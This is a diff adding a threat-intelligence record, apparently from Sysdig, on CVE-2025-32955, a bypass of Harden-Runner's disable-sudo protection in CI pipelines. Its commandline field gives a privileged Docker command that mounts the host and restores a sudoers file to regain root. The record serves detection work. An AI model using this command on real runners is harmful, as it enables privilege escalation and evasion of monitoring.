@@ -1,0 +1,34 @@
+description: CVE-2025-32955 is a vulnerability in Harden-Runner that allows attackers
+  to bypass the disable-sudo feature, potentially evading detection within CI/CD pipelines.
+  Attackers can exploit this by leveraging Docker containers to restore the sudoers
+  file and gain root access.
+date: '2025-04-22'
+authors: Sysdig Threat Research Team (TRT)
+attribution: Unknown
+TTPs:
+  processs:
+  - bash
+  - docker
+  - systemd-resolved
+  commandline:
+  - cp /host/tmp/runner /host/etc/sudoers.d/runner
+  - docker run --rm --privileged -v /:/host ubuntu bash -c "cp /host/tmp/runner /host/etc/sudoers.d/runner"
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  network_connections: []
+  file_modifications:
+  - /host/tmp/runner
+  - /host/etc/sudoers.d/runner
+  persistence: []
+  pipes: []
+  process_relations: []
+IOCs:
+  hashes: []
+  ips: []
+  domains: []
+  urls:
+  - https://github.com/step-security/harden-runner/releases/tag/v2.12.0
+  - https://github.com/step-security/harden-runner/blob/main/actions/community/action.yml
+reference: https://sysdig.com/blog/security-mechanism-bypass-in-harden-runner-github-action/
+file_creation_date: May 12, 2025
